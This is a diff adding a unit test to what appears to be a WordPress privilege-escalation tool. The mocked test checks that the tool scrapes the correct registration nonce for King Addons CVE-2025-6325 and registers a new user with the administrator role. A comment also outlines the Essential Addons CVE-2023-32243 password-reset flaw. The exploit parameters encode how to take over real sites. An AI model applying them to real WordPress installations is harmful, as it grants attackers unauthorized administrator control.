@@ -216,6 +216,32 @@ def test_register_role_harvests_nonce_and_sends_extra_and_confirm_fields():
     assert out == {"username": "svc_a", "password": "pw12345678"}
 
 
+def test_register_role_harvests_js_localized_nonce_with_object_scoping():
+    # King Addons CVE-2025-6325: register_nonce is wp_localize_script'd inside
+    # king_addons_login_register_vars, and the plugin ALSO localizes other
+    # objects that use the literal key "nonce" for unrelated actions -- object
+    # scoping is required to grab the right one.
+    http = MagicMock()
+    http.get.return_value = MagicMock(status_code=200, text=
+        'var KingAddonsSearchData = {"nonce":"WRONGNONCE"};'
+        'var king_addons_login_register_vars = {"ajax_url":"https://t/wp-admin/admin-ajax.php",'
+        '"login_nonce":"loginnonceval","register_nonce":"RIGHTNONCE"};')
+    http.post.return_value = MagicMock(status_code=200, text="ok")
+    r = {"kind": "register-role", "endpoint": "/wp-admin/admin-ajax.php",
+         "action": "king_addons_register_user",
+         "user_field": "username", "email_field": "email", "pass_field": "password",
+         "pass_confirm_field": "confirm_password",
+         "role_param": "user_role", "role_value": "administrator",
+         "nonce_from": {"url": "/", "key": "register_nonce",
+                        "object": "king_addons_login_register_vars", "param": "nonce"}}
+    out = wp_privesc.acquire_admin("https://t", http, r,
+              creds={"username": "svc_k", "email": "k@b.c", "password": "pw12345678"})
+    data = http.post.call_args.kwargs["data"]
+    assert data["nonce"] == "RIGHTNONCE"
+    assert data["user_role"] == "administrator"
+    assert out == {"username": "svc_k", "password": "pw12345678"}
+
+
 # ── password-reset with a page-harvested JS nonce + confirm field ─────────────
 # Essential Addons CVE-2023-32243: reset_password() on `init` sets any user's
 # password without validating rp_key, gated only by a nonce (action
